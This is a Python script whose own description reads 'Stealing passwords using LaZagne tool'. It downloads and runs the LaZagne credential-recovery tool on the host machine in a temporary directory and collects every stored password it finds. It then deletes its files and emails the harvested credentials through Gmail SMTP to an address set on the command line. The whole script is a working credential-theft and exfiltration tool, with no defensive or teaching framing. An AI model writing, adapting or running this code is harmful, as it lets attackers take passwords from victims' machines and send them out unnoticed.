import os
import sys
import time
import shutil
import smtplib
import tempfile
import requests
import argparse
import subprocess
from zipfile import ZipFile

class Backup():
  def get_From_address():
    return str(input("Enter From address: "))
  
  def get_Password():
    return str(input("Enter Password for from email address: "))
  
  def get_To_address():
    return str(input("Enter to address: "))

def get_arguments():
  args = argparse.ArgumentParser(description="Stealing passwords using LaZagne tool")
  args.add_argument("-f", '--from', dest='From', help='From email address')
  args.add_argument("-p", '--password', dest='password', help='password of from email address')
  args.add_argument("-t", '--to', dest='to', help='to email address')
  options = args.parse_args()
  if not options.From:
    options.From = Backup.get_From_address()
  if not options.password:
    options.password = Backup.get_Password()
  if not options.to:
    options.to = Backup.get_To_address()
  
  return options

def send_Mail(from_email, password, to_email, msg, start_time):
  try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    msg = "Subject: LaZagne output\n\n{}\n[=] Process completed in {} seconds".format(msg, time.time()-start_time)
    server.sendmail(from_email, to_email, msg)
    server.quit()
  except Exception as error:
    print("Exception occured while sending mails")
    print(error)
    sys.exit()

def download_and_report(url):
  try:
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as f:
      f.write(response.content)
    with ZipFile(file_name, 'r') as f:
      f.extractall()
    os.remove(file_name)
    os.chdir("LaZagne-2.4.3")
  except Exception as error:
    print("[-] Exception occured while downloading the file")
    print(error)
    sys.exit()
  try:
    if sys.platform in ['win32','cygwin']:
      subprocess.check_output("python -m pip install --upgrade pip", shell=True)
      subprocess.check_output("python -m pip install -r requirements.txt", shell=True)
      os.chdir("Windows")
    else:
      subprocess.check_output("pip install -r requirements.txt", shell=True)
      if sys.platform == 'linux':
        os.chdir("Linux")
      elif sys.platform == 'Mac':
        os.chdir("Mac")
      subprocess.check_output("pip install --upgrade pip", shell=True)
    result = subprocess.check_output("python LaZagne.py all", shell=True).decode()
    os.chdir("..//..")
    shutil.rmtree("LaZagne-2.4.3")
    return result
  except Exception as error:
    print("[-] Exception occured while executing the script")
    print(error)
    sys.exit()

arguments = get_arguments()

try:
  start = time.time()
  tempFile_directory = tempfile.gettempdir()
  os.chdir(tempFile_directory)
  result = download_and_report("https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip")
  send_Mail(arguments.From, arguments.password, arguments.to,  result, start)
except KeyboardInterrupt as error:
  print("\r[-] Quitting the program")
